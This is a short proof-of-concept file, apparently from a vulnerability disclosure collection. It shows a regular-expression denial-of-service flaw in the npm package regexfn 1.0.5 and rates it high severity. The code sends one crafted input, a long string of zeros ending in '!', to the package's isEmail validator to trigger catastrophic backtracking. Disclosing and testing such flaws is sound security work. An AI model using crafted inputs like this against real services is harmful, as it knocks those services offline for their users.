/**
 * regexfn@1.0.5
 * Package Manager: npm
 * Link to published package: https://github.com/Jeyaprakash1206/regexfn
 * Link to GitHub repo: https://github.com/Jeyaprakash1206/regexfn
 * Severity level: High
 * Module Description: Functions available for Common RegEx Validations
 * Additional Info: It allows cause a denial of service when validating crafted invalid emails.
 * Contacted maintainer?: No
 * Open issue?: No
 */
const regex = require('regexfn');
console.log(regex.isEmail("0000000000000000000000000000000000000000000000000000000000000000000000000000000000!"));